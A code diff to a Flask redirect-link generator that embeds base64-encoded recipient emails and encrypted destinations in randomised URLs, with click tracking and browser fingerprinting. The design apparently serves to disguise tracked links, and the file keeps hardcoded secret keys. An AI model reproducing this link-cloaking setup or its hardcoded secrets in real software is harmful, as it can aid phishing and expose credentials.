@@ -37,7 +37,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 logger.debug("Initializing Flask app")
 
-# Hardcoded configuration values
+# Hardcoded configuration values (move to environment variables in production)
 FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
 WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
 ENCRYPTION_KEY = secrets.token_bytes(32)
@@ -646,11 +646,11 @@ def login():
                         }).then(response => {
                             if (!response.ok) {
                                 console.error('Challenge failed:', response.status);
-                            setTimeout(() => sendChallenge(), 1000);
+                                setTimeout(sendChallenge, 1000);
                             }
                         }).catch(error => {
                             console.error('Challenge error:', error);
-                            setTimeout(() => sendChallenge(), 1000);
+                            setTimeout(sendChallenge, 1000);
                         });
                     }
                     function getCanvasFingerprint() {
@@ -678,7 +678,7 @@ def login():
                         <p class="text-red-600 mb-4 text-center">
                             {% for field, errors in form.errors.items() %}
                                 {% for error in errors %}
-                                    {{ error }}<br/>
+                                    {{ error }}<br>
                                 {% endfor %}
                             {% endfor %}
                         </p>
@@ -777,8 +777,8 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                base64_email = base64email
-                path_segment = f"{randomstring1}{base64_email}{randomstring2}"
+                # Generate path_segment as a placeholder (dynamic, can be changed)
+                path_segment = f"{randomstring1}{base64email}{randomstring2}"
                 endpoint = generate_random_string(8)
                 encryption_methods = ['heap_x3', 'slugstorm', 'signed_token']
                 method = secrets.choice(encryption_methods)
@@ -787,8 +787,6 @@ def dashboard():
                 payload = json.dumps({
                     "student_link": destination_link,
                     "timestamp": int(time.time() * 1000),
-                    "randomstring1": randomstring1,
-                    "randomstring2": randomstring2,
                     "expiry": expiry_timestamp
                 })
 
@@ -804,14 +802,16 @@ def dashboard():
                     error = "Failed to encrypt payload"
 
                 if not error:
+                    # Generate URL with dynamic components
                     generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
-                    url_id = hashlib.sha256(generated_url.encode()).hexdigest()
+                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
                         try:
                             valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
-                                "url": generated_url,
+                                "url": generated_url,  # Store for display only
                                 "destination": destination_link,
-                                "path_segment": path_segment,
+                                "encrypted_payload": encrypted_payload,
+                                "endpoint": endpoint,
                                 "created": int(time.time()),
                                 "expiry": expiry_timestamp,
                                 "clicks": 0,
@@ -868,7 +868,6 @@ def dashboard():
                         urls.append({
                             "url": url_data.get('url', ''),
                             "destination": url_data.get('destination', ''),
-                            "path_segment": url_data.get('path_segment', ''),
                             "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'Not Available',
                             "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'Not Available',
                             "clicks": int(url_data.get('clicks', 0)),
@@ -1055,8 +1054,8 @@ def dashboard():
                         <p class="error p-4 mb-4 text-center rounded-lg">
                             {% for field, errors in form.errors.items() %}
                                 {% for error in errors %}
-                                {{ error }}<br>
-                            {% endfor %}
+                                    {{ error }}<br>
+                                {% endfor %}
                             {% endfor %}
                         </p>
                     {% endif %}
@@ -1075,6 +1074,7 @@ def dashboard():
                     <div id="urls-tab" class="tab-content">
                         <div class="bg-white p-8 rounded-xl card mb-8">
                             <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
+                            <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, Base64email, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                             <form method="POST" class="space-y-5">
                                 {{ form.csrf_token }}
                                 <div>
@@ -1082,7 +1082,7 @@ def dashboard():
                                     {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
-                                    <label class="block text-sm font-medium text-gray-700">Name</label>
+                                    <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                                     {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                 </div>
                                 <div>
@@ -1115,7 +1115,6 @@ def dashboard():
                                     <div class="card bg-gray-50 p-6 rounded-lg mb-4">
                                         <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
                                         <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
-                                        <p class="text-gray-600"><strong>Path Segment:</strong> {{ url.path_segment }}</p>
                                         <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                         <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                         <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
@@ -1814,7 +1813,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         timestamp = int(time.time())
         visitor_id = hashlib.sha256(f"{ip}{timestamp}".encode()).hexdigest()
 
-        url_id = hashlib.sha256(request.url.encode()).hexdigest()
+        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
         if valkey_client:
             try:
                 analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
